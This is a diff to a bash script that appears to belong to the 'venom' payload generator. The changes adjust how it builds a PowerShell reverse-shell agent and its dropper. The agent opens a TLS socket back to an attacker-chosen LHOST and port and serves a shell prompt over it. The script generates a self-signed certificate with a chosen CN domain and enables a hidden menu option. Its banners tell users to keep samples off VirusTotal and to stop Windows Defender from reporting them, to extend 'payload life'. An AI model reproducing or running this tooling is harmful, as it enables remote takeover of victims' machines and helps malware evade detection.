@@ -12000,7 +11984,7 @@ echo "- ${YellowF}WARNING ABOUT SCANNING SAMPLES (VirusTotal)"${Reset};
 echo "- Please Dont test samples on Virus Total or on similar"${Reset};
 echo "- online scanners, because that will shorten the payload life."${Reset};
 echo "- And in testings also remmenber to stop the windows defender"${Reset};
-echo "- from sending samples to \$Microsoft.."${Reset};
+echo "- from sending samples to \$Microsoft.. (just in case)."${Reset};
 echo "---"
 sleep 2
 
@@ -12131,7 +12115,7 @@ echo "- ${YellowF}WARNING ABOUT SCANNING SAMPLES (VirusTotal)"${Reset};
 echo "- Please Dont test samples on Virus Total or on similar"${Reset};
 echo "- online scanners, because that will shorten the payload life."${Reset};
 echo "- And in testings also remmenber to stop the windows defender"${Reset};
-echo "- from sending samples to \$Microsoft.."${Reset};
+echo "- from sending samples to \$Microsoft.. (just in case)."${Reset};
 echo "---"
 sleep 2
 
@@ -12139,12 +12123,14 @@ lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --wid
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
 Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: downloader" --entry --width 300) > /dev/null 2>&1
 NaM=$(zenity --title="☠ Enter PAYLOAD NAME ☠" --text "example: revshell" --entry --width 300) > /dev/null 2>&1
+CN=$(zenity --title="☠ Enter CN (domain name) ☠" --text "example: SSARedTeam.com" --entry --width 300) > /dev/null 2>&1
 
 ## setting default values in case user have skip this ..
 if [ -z "$lhost" ]; then lhost="$IP";fi
 if [ -z "$lport" ]; then lport="443";fi
 if [ -z "$Drop" ]; then Drop="dropper";fi
 if [ -z "$NaM" ]; then NaM="revshell";fi
+if [ -z "$CN" ]; then CN="SSARedTeam.com";fi
 
 # display final settings to user
 echo "${BlueF}[${YellowF}i${BlueF}]${white} MODULE SETTINGS"${Reset};
@@ -12153,6 +12139,7 @@ cat << !
     LPORT    : $lport
     LHOST    : $lhost
     LOLBin   : WinHttpRequest
+    CN NAME  : $CN
     DROPPER  : $IPATH/output/$Drop.ps1
     AGENT    : $IPATH/output/$NaM.ps1
 !
@@ -12180,7 +12167,7 @@ echo "" >> $IPATH/output/$NaM.ps1
 echo "\$socket = New-Object \$NewObjectCommand('$lhost', $lport)" >> $IPATH/output/$NaM.ps1
 echo "\$stream = \$socket.GetStream()" >> $IPATH/output/$NaM.ps1
 echo "\$sslStream = New-Object System.Net.Security.SslStream(\$stream,\$false,({\$True} -as [Net.Security.RemoteCertificateValidationCallback]))" >> $IPATH/output/$NaM.ps1
-echo "\$sslStream.AuthenticateAsClient('fake.domain', \$null, \"Tls12\", \$false)" >> $IPATH/output/$NaM.ps1
+echo "\$sslStream.AuthenticateAsClient('$CN', \$null, \"Tls12\", \$false)" >> $IPATH/output/$NaM.ps1
 echo "        \$writer = new-object System.IO.StreamWriter(\$sslStream)" >> $IPATH/output/$NaM.ps1
 echo "        \$writer.Write((pwd).Path + '> ')" >> $IPATH/output/$NaM.ps1
 echo "        \$writer.flush()" >> $IPATH/output/$NaM.ps1
@@ -12196,10 +12183,10 @@ echo "}" >> $IPATH/output/$NaM.ps1
 
 
 
-## Generate SSL certificate
+## Generate SSL certificate openssl
 cd $IPATH/output
 echo "${BlueF}[☠]${white} Building SSL certificate (openssl) .."${Reset};sleep 2
-xterm -T " Building SSL certificate " -geometry 110x23 -e "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes"
+xterm -T " Building SSL certificate " -geometry 110x23 -e "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj \"/C=US/ST=Texas/L=Albany/O=Global Security/OU=IT Department/CN=$CN\""
 echo "${BlueF}[☠]${white} venom-main/output/key.pem + cert.pem ([${GreenF}OK${white}])${white} ..";sleep 1
 cd $IPATH
 
@@ -13008,8 +12995,7 @@ case $choice in
 5) sh_webshell_menu ;;
 6) sh_world ;;
 7) sh_buildin ;;
-8) echo ${YellowF}[☠]${white} Not Available, Under Develop .. ${Reset}; sleep 2; sh_menu ;;
-# 8) sh_ninja ;;
+8) sh_ninja ;;
 e|E) sh_exit ;;
 *) echo ${RedF}[x]${white} "$choice": is not a valid Option${Reset}; sleep 2 ;;
 esac
